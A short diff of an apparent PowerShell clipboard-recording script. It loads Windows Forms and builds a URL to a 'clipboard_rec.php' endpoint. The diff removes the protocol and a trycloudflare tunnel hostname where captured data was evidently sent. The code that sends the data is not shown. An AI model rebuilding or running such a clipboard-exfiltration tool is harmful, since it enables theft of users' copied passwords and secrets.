@@ -1,8 +1,8 @@
 Add-Type -AssemblyName System.Windows.Forms
 
-$proto = "https"
+$proto = ""
 $cl = ""
-$ip = "movers-exp-calculations-closure.trycloudflare.com"
+$ip = ""
 $port = ""
 $url = "${proto}://${ip}${cl}${port}/clipboard_rec.php"
 
